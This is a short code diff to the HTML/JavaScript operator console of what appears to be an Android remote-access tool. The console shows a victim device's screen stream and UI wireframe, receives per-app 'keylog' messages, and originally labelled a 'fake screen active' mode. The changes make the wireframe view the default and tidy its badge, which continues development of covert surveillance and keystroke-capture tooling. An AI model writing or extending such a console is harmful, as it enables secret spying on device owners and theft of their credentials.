@@ -132,7 +132,7 @@ body{font-family:system-ui,sans-serif;background:#0f1117;color:#e2e8f0;height:10
           <div class="screen" id="screen" onclick="handleToque(event)">
             <img id="stream-img" alt="">
             <canvas id="wireframe-canvas"></canvas>
-            <div class="wireframe-badge" id="wireframe-badge">🔷 Modo Wireframe — Tela falsa ativa</div>
+            <div class="wireframe-badge" id="wireframe-badge" style="background:#2d3748">🔷 Wireframe</div>
             <div class="screen-placeholder" id="placeholder">
               <i class="ti ti-device-mobile"></i>
               <p>Aguardando stream...</p>
@@ -240,7 +240,9 @@ function conectarTecnico(){
         if(!modoWireframe) mostrarFrame(msg.frame);
         break;
       case 'arvore_tela':
-        if(modoWireframe) desenharWireframe(JSON.parse(msg.elementos), msg.pacote);
+        // Sempre mostra wireframe (modo principal de visualização)
+        ativarModoWireframe();
+        desenharWireframe(JSON.parse(msg.elementos), msg.pacote);
         break;
       case 'keylog': logKey(msg.texto,msg.app||'desconhecido'); break;
       case 'cliente_desconectou': log('Cliente desconectou','err'); break;
@@ -252,6 +254,7 @@ function conectarTecnico(){
 // ── Wireframe ──────────────────────────────────────────────────────────────
 
 function ativarModoWireframe(){
+  if(modoWireframe) return; // já ativo, não repete
   modoWireframe = true;
   document.getElementById('stream-img').style.display='none';
   document.getElementById('wireframe-canvas').style.display='block';
